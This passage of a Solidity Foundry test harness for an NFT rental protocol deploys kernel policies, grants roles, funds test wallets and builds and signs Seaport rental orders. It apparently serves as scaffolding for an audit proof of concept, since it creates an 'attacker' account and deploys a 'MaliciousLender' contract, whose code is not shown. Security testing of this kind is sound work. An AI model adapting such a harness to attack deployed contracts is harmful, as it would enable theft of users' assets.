      vm.label(address(admin), \"AdminPolicy\");\n        }\n\n        function _deployGuardPolicy() internal {\n            // abi encode the guard policy bytecode and constructor arguments\n            bytes memory guardInitCode = abi.encodePacked(\n                type(Guard).creationCode,\n                abi.encode(address(kernel))\n            );\n\n            // Deploy guard policy contract\n            vm.prank(deployer.addr);\n            guard = Guard(create2Deployer.deploy(salt, guardInitCode));\n\n            // label the contract\n            vm.label(address(guard), \"GuardPolicy\");\n        }\n\n        function _deployFactoryPolicy() internal {\n            // abi encode the factory policy bytecode and constructor arguments\n            bytes memory factoryInitCode = abi.encodePacked(\n                type(Factory).creationCode,\n                abi.encode(\n                    address(kernel),\n                    address(stop),\n                    address(guard),\n                    address(fallbackHandler),\n                    address(safeProxyFactory),\n                    address(safeSingleton)\n                )\n            );\n\n            // Deploy factory policy contract\n            vm.prank(deployer.addr);\n            factory = Factory(create2Deployer.deploy(salt, factoryInitCode));\n\n            // label the contract\n            vm.label(address(factory), \"FactoryPolicy\");\n        }\n\n        function _setupKernel() internal {\n            // Start impersonating the deployer\n            vm.startPrank(deployer.addr);\n\n            // Install modules\n            kernel.executeAction(Actions.InstallModule, address(STORE));\n            kernel.executeAction(Actions.InstallModule, address(ESCRW));\n\n            // Approve policies\n            kernel.executeAction(Actions.ActivatePolicy, address(create));\n            kernel.executeAction(Actions.ActivatePolicy, address(stop));\n            kernel.executeAction(Actions.ActivatePolicy, address(factory));\n            kernel.executeAction(Actions.ActivatePolicy, address(guard));\n            kernel.executeAction(Actions.ActivatePolicy, address(admin));\n\n            // Grant `seaport` role to seaport protocol\n            kernel.grantRole(toRole(\"SEAPORT\"), address(seaport));\n\n            // Grant `signer` role to the protocol signer to sign off on create payloads\n            kernel.grantRole(toRole(\"CREATE_SIGNER\"), rentalSigner.addr);\n\n            // Grant 'admin_admin` role to the address which can conduct admin operations on the protocol\n            kernel.grantRole(toRole(\"ADMIN_ADMIN\"), deployer.addr);\n\n            // Grant 'guard_admin` role to the address which can toggle hooks\n            kernel.grantRole(toRole(\"GUARD_ADMIN\"), deployer.addr);\n\n            // Grant `stop_admin` role to the address which can skim funds from the payment escrow\n            kernel.grantRole(toRole(\"STOP_ADMIN\"), deployer.addr);\n\n            // Stop impersonating the deployer\n            vm.stopPrank();\n        }\n\n        function setUp() public virtual override {\n            // setup dependencies\n            super.setUp();\n\n            // create the rental signer address and private key\n            rentalSigner = vm.createWallet(\"rentalSigner\");\n\n            // create the deployer address and private key\n            deployer = vm.createWallet(\"deployer\");\n\n            // contract salts (using 0x000000000000000000000100 to represent a version 1.0.0 of each contract)\n            protocolVersion = 0x000000000000000000000100;\n            salt = create2Deployer.generateSaltWithSender(deployer.addr, protocolVersion);\n\n            // deploy kernel\n            _deployKernel();\n\n            // Deploy payment escrow\n            _deployPaymentEscrowModule();\n\n            // Deploy rental storage\n            _deployStorageModule();\n\n            // deploy create policy\n            _deployCreatePolicy();\n\n            // deploy stop policy\n            _deployStopPolicy();\n\n            // deploy admin policy\n            _deployAdminPolicy();\n\n            // Deploy guard policy\n            _deployGuardPolicy();\n\n            // deploy rental factory\n            _deployFactoryPolicy();\n\n            // intialize the kernel\n            _setupKernel();\n        }\n    }\n\n\n    // Creates test accounts to interact with the V3 protocol\n    // Borrowed from test/fixtures/protocol/AccountCreator\n    contract AccountCreator is Protocol {\n        // Protocol accounts for testing\n        ProtocolAccount public alice;\n        ProtocolAccount public bob;\n        ProtocolAccount public carol;\n        ProtocolAccount public dan;\n        ProtocolAccount public eve;\n        ProtocolAccount public attacker;\n        MaliciousLender maliciousLenderContract;\n\n        // Mock tokens for testing\n        MockERC20[] public erc20s;\n        MockERC721[] public erc721s;\n        MockERC1155[] public erc1155s;\n\n        function setUp() public virtual override {\n            super.setUp();\n\n            // deploy 3 erc20 tokens, 3 erc721 tokens, and 3 erc1155 tokens\n            _deployTokens(3);\n\n            // instantiate all wallets and deploy rental safes for each\n            alice = _fundWalletAndDeployRentalSafe(\"alice\");\n            bob = _fundWalletAndDeployRentalSafe(\"bob\");\n            carol = _fundWalletAndDeployRentalSafe(\"carol\");\n            dan = _fundWalletAndDeployRentalSafe(\"dan\");\n            eve = _fundWalletAndDeployRentalSafe(\"eve\");\n            attacker = _fundWalletAndDeployRentalSafe(\"attacker\");\n\n            vm.prank(attacker.addr);\n            maliciousLenderContract = new MaliciousLender(); // attacker.addr will be the owner of this contract\n\n\n        }\n\n        function _deployTokens(uint256 numTokens) internal {\n            for (uint256 i; i < numTokens; i++) {\n                _deployErc20Token();\n                _deployErc721Token();\n                _deployErc1155Token();\n            }\n        }\n\n        function _deployErc20Token() internal returns (uint256 i) {\n            // save the token's index\n            i = erc20s.length;\n\n            // deploy the mock token\n            MockERC20 token = new MockERC20();\n\n            // push the token to the array of mocks\n            erc20s.push(token);\n\n            // set the token label with the index\n            vm.label(address(token), string.concat(\"MERC20_\", LibString.toString(i)));\n        }\n\n        function _deployErc721Token() internal returns (uint256 i) {\n            // save the token's index\n            i = erc721s.length;\n\n            // deploy the mock token\n            MockERC721 token = new MockERC721();\n\n            // push the token to the array of mocks\n            erc721s.push(token);\n\n            // set the token label with the index\n            vm.label(address(token), string.concat(\"MERC721_\", LibString.toString(i)));\n        }\n\n        function _deployErc1155Token() internal returns (uint256 i) {\n            // save the token's index\n            i = erc1155s.length;\n\n            // deploy the mock token\n            MockERC1155 token = new MockERC1155();\n\n            // push the token to the array of mocks\n            erc1155s.push(token);\n\n            // set the token label with the index\n            vm.label(address(token), string.concat(\"MERC1155_\", LibString.toString(i)));\n        }\n\n        function _deployRentalSafe(\n            address owner,\n            string memory name\n        ) internal returns (address safe) {\n            // Deploy a 1/1 rental safe\n            address[] memory owners = new address[](1);\n            owners[0] = owner;\n            safe = factory.deployRentalSafe(owners, 1);\n\n        }\n\n        function _fundWalletAndDeployRentalSafe(\n            string memory name\n        ) internal returns (ProtocolAccount memory account) {\n            // create a wallet with a address, public key, and private key\n            Vm.Wallet memory wallet = vm.createWallet(name);\n\n            // deploy a rental safe for the address\n            address rentalSafe = _deployRentalSafe(wallet.addr, name);\n\n            // fund the wallet with ether, all erc20s, and approve the conduit for erc20s, erc721s, erc1155s\n            _allocateTokensAndApprovals(wallet.addr, 10000);\n\n            // create an account\n            account = ProtocolAccount({\n                addr: wallet.addr,\n                safe: SafeL2(payable(rentalSafe)),\n                publicKeyX: wallet.publicKeyX,\n                publicKeyY: wallet.publicKeyY,\n                privateKey: wallet.privateKey\n            });\n\n        }\n\n\n\n        function _allocateTokensAndApprovals(address to, uint128 amount) internal {\n            // deal ether to the recipient\n            vm.deal(to, amount);\n\n            // mint all erc20 tokens to the recipient\n            for (uint256 i = 0; i < erc20s.length; ++i) {\n                erc20s[i].mint(to, amount);\n            }\n\n            // set token approvals\n            _setApprovals(to);\n        }\n\n        function _setApprovals(address owner) internal {\n            // impersonate the owner address\n            vm.startPrank(owner);\n\n            // set all approvals for erc20 tokens\n            for (uint256 i = 0; i < erc20s.length; ++i) {\n                erc20s[i].approve(address(conduit), type(uint256).max);\n            }\n\n            // set all approvals for erc721 tokens\n            for (uint256 i = 0; i < erc721s.length; ++i) {\n                erc721s[i].setApprovalForAll(address(conduit), true);\n            }\n\n            // set all approvals for erc1155 tokens\n            for (uint256 i = 0; i < erc1155s.length; ++i) {\n                erc1155s[i].setApprovalForAll(address(conduit), true);\n            }\n\n            // stop impersonating\n            vm.stopPrank();\n        }\n    }\n\n\n    // Sets up logic in the test engine related to order creation\n    // Borrowed from test/fixtures/engine/OrderCreator\n    contract OrderCreator is AccountCreator {\n        using OfferItemLib for OfferItem;\n        using ConsiderationItemLib for ConsiderationItem;\n        using OrderComponentsLib for OrderComponents;\n        using OrderLib for Order;\n        using ECDSA for bytes32;\n\n        // defines a config for a standard order component\n        string constant STANDARD_ORDER_COMPONENTS = \"standard_order_components\";\n\n        struct OrderToCreate {\n            ProtocolAccount offerer;\n            OfferItem[] offerItems;\n            ConsiderationItem[] considerationItems;\n            OrderMetadata metadata;\n        }\n\n        // keeps track of tokens used during a test\n        uint256[] usedOfferERC721s;\n        uint256[] usedOfferERC1155s;\n\n        uint256[] usedConsiderationERC721s;\n        uint256[] usedConsiderationERC1155s;\n\n        // components of an order\n        OrderToCreate orderToCreate;\n\n        function setUp() public virtual override {\n            super.setUp();\n\n            // Define a standard OrderComponents struct which is ready for\n            // use with the Create Policy and the protocol conduit contract\n            OrderComponentsLib\n                .empty()\n                .withOrderType(SeaportOrderType.FULL_RESTRICTED)\n                .withZone(address(create))\n                .withStartTime(block.timestamp)\n                .withEndTime(block.timestamp + 100)\n                .withSalt(123456789)\n                .withConduitKey(conduitKey)\n                .saveDefault(STANDARD_ORDER_COMPONENTS);\n\n            // for each test token, create a storage slot\n            for (uint256 i = 0; i < erc721s.length; i++) {\n                usedOfferERC721s.push();\n                usedConsiderationERC721s.push();\n\n                usedOfferERC1155s.push();\n                usedConsiderationERC1155s.push();\n            }\n        }\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                                Order Creation                               //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        // creates an order based on the provided context. The defaults on this order\n        // are good for most test cases.\n        function createOrder(\n            ProtocolAccount memory offerer,\n            OrderType orderType,\n            uint256 erc721Offers,\n            uint256 erc1155Offers,\n            uint256 erc20Offers,\n            uint256 erc721Considerations,\n            uint256 erc1155Considerations,\n            uint256 erc20Considerations\n        ) internal {\n            // require that the number of offer items or consideration items\n            // dont exceed the number of test tokens\n            require(\n                erc721Offers <= erc721s.length &&\n                    erc721Offers <= erc1155s.length &&\n                    erc20Offers <= erc20s.length,\n                \"TEST: too many offer items defined\"\n            );\n            require(\n                erc721Considerations <= erc721s.length &&\n                    erc1155Considerations <= erc1155s.length &&\n                    erc20Considerations <= erc20s.length,\n                \"TEST: too many consideration items defined\"\n            );\n\n            // create the offerer\n            _createOfferer(offerer);\n\n            // add the offer items\n            _createOfferItems(erc721Offers, erc1155Offers, erc20Offers);\n\n            // create the consideration items\n            _createConsiderationItems(\n                erc721Considerations,\n                erc1155Considerations,\n                erc20Considerations\n            );\n\n            // Create order metadata\n            _createOrderMetadata(orderType);\n        }\n\n        // Creates an offerer on the order to create\n        function _createOfferer(ProtocolAccount memory offerer) private {\n            orderToCreate.offerer = offerer;\n        }\n\n        // Creates offer items which are good for most tests\n        function _createOfferItems(\n            uint256 erc721Offers,\n            uint256 erc1155Offers,\n            uint256 erc20Offers\n        ) private {\n            // generate the ERC721 offer items\n            for (uint256 i = 0; i < erc721Offers; ++i) {\n                // create the offer item\n                orderToCreate.offerItems.push(\n                    OfferItemLib\n                        .empty()\n                        .withItemType(ItemType.ERC721)\n                        .withToken(address(erc721s[i]))\n                        .withIdentifierOrCriteria(usedOfferERC721s[i])\n                        .withStartAmount(1)\n                        .withEndAmount(1)\n                );\n\n                // mint an erc721 to the offerer\n                erc721s[i].mint(orderToCreate.offerer.addr);\n\n                // update the used token so it cannot be used again in the same test\n                usedOfferERC721s[i]++;\n            }\n\n            // generate the ERC1155 offer items\n            for (uint256 i = 0; i < erc1155Offers; ++i) {\n                // create the offer item\n                orderToCreate.offerItems.push(\n                    OfferItemLib\n                        .empty()\n                        .withItemType(ItemType.ERC1155)\n                        .withToken(address(erc1155s[i]))\n                        .withIdentifierOrCriteria(usedOfferERC1155s[i])\n                        .withStartAmount(100)\n                        .withEndAmount(100)\n                );\n\n                // mint an erc1155 to the offerer\n                erc1155s[i].mint(orderToCreate.offerer.addr, 100);\n\n                // update the used token so it cannot be used again in the same test\n                usedOfferERC1155s[i]++;\n            }\n\n            // generate the ERC20 offer items\n            for (uint256 i = 0; i < erc20Offers; ++i) {\n                // create the offer item\n                orderToCreate.offerItems.push(\n                    OfferItemLib\n                        .empty()\n                        .withItemType(ItemType.ERC20)\n                        .withToken(address(erc20s[i]))\n                        .withStartAmount(100)\n                        .withEndAmount(100)\n                );\n            }\n        }\n\n        // Creates consideration items that are good for most tests\n        function _createConsiderationItems(\n            uint256 erc721Considerations,\n            uint256 erc1155Considerations,\n            uint256 erc20Considerations\n        ) private {\n            // generate the ERC721 consideration items\n            for (uint256 i = 0; i < erc721Considerations; ++i) {\n                // create the consideration item, and set the recipient as the offerer's\n                // rental safe address\n                orderToCreate.considerationItems.push(\n                    ConsiderationItemLib\n                        .empty()\n                        .withRecipient(address(orderToCreate.offerer.safe))\n                        .withItemType(ItemType.ERC721)\n                        .withToken(address(erc721s[i]))\n                        .withIdentifierOrCriteria(usedConsiderationERC721s[i])\n                        .withStartAmount(1)\n                        .withEndAmount(1)\n                );\n\n                // update the used token so it cannot be used again in the same test\n                usedConsiderationERC721s[i]++;\n            }\n\n            // generate the ERC1155 consideration items\n            for (uint256 i = 0; i < erc1155Considerations; ++i) {\n                // create the consideration item, and set the recipient as the offerer's\n                // rental safe address\n                orderToCreate.considerationItems.push(\n                    ConsiderationItemLib\n                        .empty()\n                        .withRecipient(address(orderToCreate.offerer.safe))\n                        .withItemType(ItemType.ERC1155)\n                        .withToken(address(erc1155s[i]))\n                        .withIdentifierOrCriteria(usedConsiderationERC1155s[i])\n                        .withStartAmount(100)\n                        .withEndAmount(100)\n                );\n\n                // update the used token so it cannot be used again in the same test\n                usedConsiderationERC1155s[i]++;\n            }\n\n            // generate the ERC20 consideration items\n            for (uint256 i = 0; i < erc20Considerations; ++i) {\n                // create the offer item\n                orderToCreate.considerationItems.push(\n                    ConsiderationItemLib\n                        .empty()\n                        .withRecipient(address(ESCRW))\n                        .withItemType(ItemType.ERC20)\n                        .withToken(address(erc20s[i]))\n                        .withStartAmount(100)\n                        .withEndAmount(100)\n                );\n            }\n        }\n\n        // Creates a order metadata that is good for most tests\n        function _createOrderMetadata(OrderType orderType) private {\n            // Create order metadata\n            orderToCreate.metadata.orderType = orderType;\n            orderToCreate.metadata.rentDuration = 500;\n            orderToCreate.metadata.emittedExtraData = new bytes(0);\n        }\n\n        // creates a signed seaport order ready to be fulfilled by a renter\n        function _createSignedOrder(\n            ProtocolAccount memory _offerer,\n            OfferItem[] memory _offerItems,\n            ConsiderationItem[] memory _considerationItems,\n            OrderMetadata memory _metadata\n        ) private view returns (Order memory order, bytes32 orderHash) {\n            // Build the order components\n            OrderComponents memory orderComponents = OrderComponentsLib\n                .fromDefault(STANDARD_ORDER_COMPONENTS)\n                .withOfferer(_offerer.addr)\n                .withOffer(_offerItems)\n                .withConsideration(_considerationItems)\n                .withZoneHash(create.getOrderMetadataHash(_metadata))\n                .withCounter(seaport.getCounter(_offerer.addr));\n\n            // generate the order hash\n            orderHash = seaport.getOrderHash(orderComponents);\n\n            // generate the signature for the order components\n            bytes memory signature = _signSeaportOrder(_offerer.privateKey, orderHash);\n\n            // create the order, but dont provide a signature if its a PAYEE order.\n            // Since PAYEE orders are fulfilled by the offerer of the order, they\n            // dont need a signature.\n            if (_metadata.orderType == OrderType.PAYEE) {\n                order = OrderLib.empty().withParameters(orderComponents.toOrderParameters());\n            } else {\n                order = OrderLib\n                    .empty()\n                    .withParameters(orderComponents.toOrderParameters())\n                    .withSignature(signature);\n            }\n        }\n\n        function _signSeaportOrder(\n            uint256 signerPrivateKey,\n            bytes32 orderHash\n        ) private view returns (bytes memory signature) {\n            // fetch domain separator from seaport\n            (, bytes32 domainSeparator, ) = seaport.information();\n\n            // sign the EIP-712 digest\n            (uint8 v, bytes32 r, bytes32 s) = vm.sign(\n                signerPrivateKey,\n                domainSeparator.toTypedDataHash(orderHash)\n            );\n\n            // encode the signature\n            signature = abi.encodePacked(r, s, v);\n        }\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                               Order Amendments                              //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        function resetOrderToCreate() internal {\n            delete orderToCreate;\n        }\n\n        function withOfferer(ProtocolAccount memory _offerer) internal {\n            orderToCreate.offerer = _offerer;\n        }\n\n        function resetOfferer() internal {\n            delete orderToCreate.offerer;\n        }\n\n        function withReplacedOfferItems(OfferItem[] memory _offerItems) internal {\n            // reset all current offer items\n            resetOfferItems();\n\n            // add the new offer items to storage\n            for (uint256 i = 0; i < _offerItems.length; i++) {\n                orderToCreate.offerItems.push(_offerItems[i]);\n            }\n        }\n\n        function withOfferItem(OfferItem memory offerItem) internal {\n            orderToCreate.offerItems.push(offerItem);\n        }\n\n        function resetOfferItems() internal {\n            delete orderToCreate.offerItems;\n        }\n\n        function popOfferItem() internal {\n            orderToCreate.offerItems.pop();\n        }\n\n        function withReplacedConsiderationItems(\n            ConsiderationItem[] memory _considerationItems\n        ) internal {\n            // reset all current consideration items\n            resetConsiderationItems();\n\n            // add the new consideration items to storage\n            for (uint256 i = 0; i < _considerationItems.length; i++) {\n                orderToCreate.considerationItems.push(_considerationItems[i]);\n            }\n        }\n\n        function withConsiderationItem(ConsiderationItem memory considerationItem) internal {\n            orderToCreate.considerationItems.push(considerationItem);\n        }\n\n        function resetConsiderationItems() internal {\n            delete orderToCreate.considerationItems;\n        }\n\n        function popConsiderationItem() internal {\n            orderToCreate.considerationItems.pop();\n        }\n\n        function withHooks(Hook[] memory hooks) internal {\n            // delete the current metatdata hooks\n            delete orderToCreate.metadata.hooks;\n\n            // add each metadata hook to storage\n            for (uint256 i = 0; i < hooks.length; i++) {\n                orderToCreate.metadata.hooks.push(hooks[i]);\n            }\n        }\n\n        function withOrderMetadata(OrderMetadata memory _metadata) internal {\n            // update the static metadata parameters\n            orderToCreate.metadata.orderType = _metadata.orderType;\n            orderToCreate.metadata.rentDuration = _metadata.rentDuration;\n            orderToCreate.metadata.emittedExtraData = _metadata.emittedExtraData;\n\n            // update the hooks\n            withHooks(_metadata.hooks);\n        }\n\n        function resetOrderMetadata() internal {\n            delete orderToCreate.metadata;\n        }\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                              Order Finalization                             //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        function finalizeOrder()\n            internal\n            returns (Order memory, bytes32, OrderMetadata memory)\n        {\n            // create and sign the order\n            (Order memory order, bytes32 orderHash) = _createSignedOrder(\n                orderToCreate.offerer,\n                orderToCreate.offerItems,\n                orderToCreate.considerationItems,\n                orderToCreate.metadata\n            );\n\n            // pull order metadata into memory\n            OrderMetadata memory metadata = orderToCreate.metadata;\n\n            // clear structs\n            resetOrderToCreate();\n\n            return (order, orderHash, metadata);\n        }\n    }\n\n\n    // Sets up logic in the test engine related to order fulfillment\n    // Borrowed from test/fixtures/engine/OrderFulfiller\n    contract OrderFulfiller is OrderCreator {\n        using ECDSA for bytes32;\n\n        struct OrderToFulfill {\n            bytes32 orderHash;\n            RentPayload payload;\n            AdvancedOrder advancedOrder;\n        }\n\n        // components of a fulfillment\n        ProtocolAccount fulfiller;\n        OrderToFulfill[] ordersToFulfill;\n        Fulfillment[] seaportMatchOrderFulfillments;\n        FulfillmentComponent[][] seaportOfferFulfillments;\n        FulfillmentComponent[][] seaportConsiderationFulfillments;\n        address seaportRecipient;\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                             Fulfillment Creation                            //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        // creates an order fulfillment\n        function createOrderFulfillment(\n            ProtocolAccount memory _fulfiller,\n            Order memory order,\n            bytes32 orderHash,\n            OrderMetadata memory metadata\n        ) internal {\n            // set the fulfiller account\n            fulfiller = _fulfiller;\n\n            // set the recipient of any offer items after an order is fulfilled. If the fulfillment is via\n            // `matchAdvancedOrders`, then any unspent offer items will go to this address as well\n            seaportRecipient = address(_fulfiller.safe);\n\n            // get a pointer to a new order to fulfill\n            OrderToFulfill storage orderToFulfill = ordersToFulfill.push();\n\n            // create an order fulfillment\n            OrderFulfillment memory fulfillment = OrderFulfillment(address(_fulfiller.safe));\n\n            // add the order hash and fulfiller\n            orderToFulfill.orderHash = orderHash;\n\n            // create rental zone payload data\n            _createRentalPayload(\n                orderToFulfill.payload,\n                RentPayload(fulfillment, metadata, block.timestamp + 100, _fulfiller.addr)\n            );\n\n            // generate the signature for the payload\n            bytes memory signature = _signProtocolOrder(\n                rentalSigner.privateKey,\n                create.getRentPayloadHash(orderToFulfill.payload)\n            );\n\n            // create an advanced order from the order. Pass the rental\n            // payload as extra data\n            _createAdvancedOrder(\n                orderToFulfill.advancedOrder,\n                AdvancedOrder(\n                    order.parameters,\n                    1,\n                    1,\n                    order.signature,\n                    abi.encode(orderToFulfill.payload, signature)\n                )\n            );\n        }\n\n        function _createOrderFulfiller(\n            ProtocolAccount storage storageFulfiller,\n            ProtocolAccount memory _fulfiller\n        ) private {\n            storageFulfiller.addr = _fulfiller.addr;\n            storageFulfiller.safe = _fulfiller.safe;\n            storageFulfiller.publicKeyX = _fulfiller.publicKeyX;\n            storageFulfiller.publicKeyY = _fulfiller.publicKeyY;\n            storageFulfiller.privateKey = _fulfiller.privateKey;\n        }\n\n        function _createOrderFulfillment(\n            OrderFulfillment storage storageFulfillment,\n            OrderFulfillment memory fulfillment\n        ) private {\n            storageFulfillment.recipient = fulfillment.recipient;\n        }\n\n        function _createOrderMetadata(\n            OrderMetadata storage storageMetadata,\n            OrderMetadata memory metadata\n        ) private {\n            // Create order metadata in storage\n            storageMetadata.orderType = metadata.orderType;\n            storageMetadata.rentDuration = metadata.rentDuration;\n            storageMetadata.emittedExtraData = metadata.emittedExtraData;\n\n            // dynamically push the hooks from memory to storage\n            for (uint256 i = 0; i < metadata.hooks.length; i++) {\n                storageMetadata.hooks.push(metadata.hooks[i]);\n            }\n        }\n\n        function _createRentalPayload(\n            RentPayload storage storagePayload,\n            RentPayload memory payload\n        ) private {\n            // set payload fulfillment on the order to fulfill\n            _createOrderFulfillment(storagePayload.fulfillment, payload.fulfillment);\n\n            // set payload metadata on the order to fulfill\n            _createOrderMetadata(storagePayload.metadata, payload.metadata);\n\n            // set payload expiration on the order to fulfill\n            storagePayload.expiration = payload.expiration;\n\n            // set payload intended fulfiller on the order to fulfill\n            storagePayload.intendedFulfiller = payload.intendedFulfiller;\n        }\n\n        function _createAdvancedOrder(\n            AdvancedOrder storage storageAdvancedOrder,\n            AdvancedOrder memory advancedOrder\n        ) private {\n            // create the order parameters on the order to fulfill\n            _createOrderParameters(storageAdvancedOrder.parameters, advancedOrder.parameters);\n\n            // create the rest of the static parameters on the order to fulfill\n            storageAdvancedOrder.numerator = advancedOrder.numerator;\n            storageAdvancedOrder.denominator = advancedOrder.denominator;\n            storageAdvancedOrder.signature = advancedOrder.signature;\n            storageAdvancedOrder.extraData = advancedOrder.extraData;\n        }\n\n        function _createOrderParameters(\n            OrderParameters storage storageOrderParameters,\n            OrderParameters memory orderParameters\n        ) private {\n            // create the static order parameters for the order to fulfill\n            storageOrderParameters.offerer = orderParameters.offerer;\n            storageOrderParameters.zone = orderParameters.zone;\n            storageOrderParameters.orderType = orderParameters.orderType;\n            storageOrderParameters.startTime = orderParameters.startTime;\n            storageOrderParameters.endTime = orderParameters.endTime;\n            storageOrderParameters.zoneHash = orderParameters.zoneHash;\n            storageOrderParameters.salt = orderParameters.salt;\n            storageOrderParameters.conduitKey = orderParameters.conduitKey;\n            storageOrderParameters.totalOriginalConsiderationItems = orderParameters\n                .totalOriginalConsiderationItems;\n\n            // create the dynamic order parameters for the order to fulfill\n            for (uint256 i = 0; i < orderParameters.offer.length; i++) {\n                storageOrderParameters.offer.push(orderParameters.offer[i]);\n            }\n            for (uint256 i = 0; i < orderParameters.consideration.length; i++) {\n                storageOrderParameters.consideration.push(orderParameters.consideration[i]);\n            }\n        }\n\n        function _createSeaportFulfillment(\n            Fulfillment storage storageFulfillment,\n            Fulfillment memory fulfillment\n        ) private {\n            // push the offer components to storage\n            for (uint256 i = 0; i < fulfillment.offerComponents.length; i++) {\n                storageFulfillment.offerComponents.push(fulfillment.offerComponents[i]);\n            }\n\n            // push the consideration components to storage\n            for (uint256 i = 0; i < fulfillment.considerationComponents.length; i++) {\n                storageFulfillment.considerationComponents.push(\n                    fulfillment.considerationComponents[i]\n                );\n            }\n        }\n\n        function _seaportItemTypeToRentalItemType(\n            SeaportItemType seaportItemType\n        ) internal pure returns (RentalItemType) {\n            if (seaportItemType == SeaportItemType.ERC20) {\n                return RentalItemType.ERC20;\n            } else if (seaportItemType == SeaportItemType.ERC721) {\n                return RentalItemType.ERC721;\n            } else if (seaportItemType == SeaportItemType.ERC1155) {\n                return RentalItemType.ERC1155;\n            } else {\n                revert(\"seaport item type not supported\");\n            }\n        }\n\n        function _createRentalOrder(\n            OrderToFulfill memory orderToFulfill\n        ) internal view returns (RentalOrder memory rentalOrder) {\n            // get the order parameters\n            OrderParameters memory parameters = orderToFulfill.advancedOrder.parameters;\n\n            // get the payload\n            RentPayload memory payload = orderToFulfill.payload;\n\n            // get the metadata\n            OrderMetadata memory metadata = payload.metadata;\n\n            // construct a rental order\n            rentalOrder = RentalOrder({\n                seaportOrderHash: orderToFulfill.orderHash,\n                items: new Item[](parameters.offer.length + parameters.consideration.length),\n                hooks: metadata.hooks,\n                orderType: metadata.orderType,\n                lender: parameters.offerer,\n                renter: payload.intendedFulfiller,\n                rentalWallet: payload.fulfillment.recipient,\n                startTimestamp: block.timestamp,\n                endTimestamp: block.timestamp + metadata.rentDuration\n            });\n\n            // for each new offer item being rented, create a new item struct to add to the rental order\n            for (uint256 i = 0; i < parameters.offer.length; i++) {\n                // PAYEE orders cannot have offer items\n                require(\n                    metadata.orderType != OrderType.PAYEE,\n                    \"TEST: cannot have offer items in PAYEE order\"\n                );\n\n                // get the offer item\n                OfferItem memory offerItem = parameters.offer[i];\n\n                // determine the item type\n                RentalItemType itemType = _seaportItemTypeToRentalItemType(offerItem.itemType);\n\n                // determine which entity the payment will settle to\n                SettleTo settleTo = offerItem.itemType == SeaportItemType.ERC20\n                    ? SettleTo.RENTER\n                    : SettleTo.LENDER;\n\n                // create a new rental item\n                rentalOrder.items[i] = Item({\n                    itemType: itemType,\n                    settleTo: settleTo,\n                    token: offerItem.token,\n                    amount: offerItem.startAmount,\n                    identifier: offerItem.identifierOrCriteria\n                });\n            }\n\n            // for each consideration item in return, create a new item struct to add to the rental order\n            for (uint256 i = 0; i < parameters.consideration.length; i++) {\n                // PAY orders cannot have consideration items\n                require(\n                    metadata.orderType != OrderType.PAY,\n                    \"TEST: cannot have consideration items in PAY order\"\n                );\n\n                // get the offer item\n                ConsiderationItem memory considerationItem = parameters.consideration[i];\n\n                // determine the item type\n                RentalItemType itemType = _seaportItemTypeToRentalItemType(\n                    considerationItem.itemType\n                );\n\n                // determine which entity the payment will settle to\n                SettleTo settleTo = metadata.orderType == OrderType.PAYEE &&\n                    considerationItem.itemType == SeaportItemType.ERC20\n                    ? SettleTo.RENTER\n                    : SettleTo.LENDER;\n\n                // calculate item index offset\n                uint256 itemIndex = i + parameters.offer.length;\n\n                // create a new payment item\n                rentalOrder.items[itemIndex] = Item({\n                    itemType: itemType,\n                    settleTo: settleTo,\n                    token: considerationItem.token,\n                    amount: considerationItem.startAmount,\n                    identifier: considerationItem.identifierOrCriteria\n                });\n            }\n        }\n\n        function _signProtocolOrder(\n            uint256 signerPrivateKey,\n            bytes32 payloadHash\n        ) internal view returns (bytes memory signature) {\n            // fetch domain separator from create policy\n            bytes32 domainSeparator = create.domainSeparator();\n\n            // sign the EIP-712 digest\n            (uint8 v, bytes32 r, bytes32 s) = vm.sign(\n                signerPrivateKey,\n                domainSeparator.toTypedDataHash(payloadHash)\n            );\n\n            // encode the signature\n            signature = abi.encodePacked(r, s, v);\n        }\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                            Fulfillment Amendments                           //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        function withFulfiller(ProtocolAccount memory _fulfiller) internal {\n            fulfiller = _fulfiller;\n        }\n\n        function withRecipient(address _recipient) internal {\n            seaportRecipient = _recipient;\n        }\n\n        function withAdvancedOrder(\n            AdvancedOrder memory _advancedOrder,\n            uint256 orderIndex\n        ) internal {\n            // get a storage pointer to the order to fulfill\n            OrderToFulfill storage orderToFulfill = ordersToFulfill[orderIndex];\n\n            // set the new advanced order\n            _createAdvancedOrder(orderToFulfill.advancedOrder, _advancedOrder);\n        }\n\n        function withSeaportMatchOrderFulfillment(Fulfillment memory _fulfillment) internal {\n            // get a pointer to a new seaport fulfillment\n            Fulfillment storage fulfillment = seaportMatchOrderFulfillments.push();\n\n            // set the fulfillment\n            _createSeaportFulfillment(\n                fulfillment,\n                Fulfillment({\n                    offerComponents: _fulfillment.offerComponents,\n                    considerationComponents: _fulfillment.considerationComponents\n                })\n            );\n        }\n\n        function withSeaportMatchOrderFulfillments(\n            Fulfillment[] memory fulfillments\n        ) internal {\n            // reset all current seaport match order fulfillments\n            resetSeaportMatchOrderFulfillments();\n\n            // add the new offer items to storage\n            for (uint256 i = 0; i < fulfillments.length; i++) {\n                // get a pointer to a new seaport fulfillment\n                Fulfillment storage fulfillment = seaportMatchOrderFulfillments.push();\n\n                // set the fulfillment\n                _createSeaportFulfillment(\n                    fulfillment,\n                    Fulfillment({\n                        offerComponents: fulfillments[i].offerComponents,\n                        considerationComponents: fulfillments[i].considerationComponents\n                    })\n                );\n            }\n        }\n\n        function withBaseOrderFulfillmentComponents() internal {\n            // create offer fulfillments. We need to specify which offer items can be aggregated\n            // into one transaction. For example, 2 different orders where the same seller is offering\n            // the same item in each.\n            //\n            // Since BASE orders will only contain ERC721 offer items, these cannot be aggregated. So, a separate fulfillment\n            // is created for each order.\n            for (uint256 i = 0; i < ordersToFulfill.length; i++) {\n                // get a pointer to a new offer fulfillment array. This array will contain indexes of\n                // orders and items which are all grouped on whether they can be combined in a single transferFrom()\n                FulfillmentComponent[] storage offerFulfillments = seaportOfferFulfillments\n                    .push();\n\n                // number of offer items in the order\n                uint256 offerItemsInOrder = ordersToFulfill[i]\n                    .advancedOrder\n                    .parameters\n                    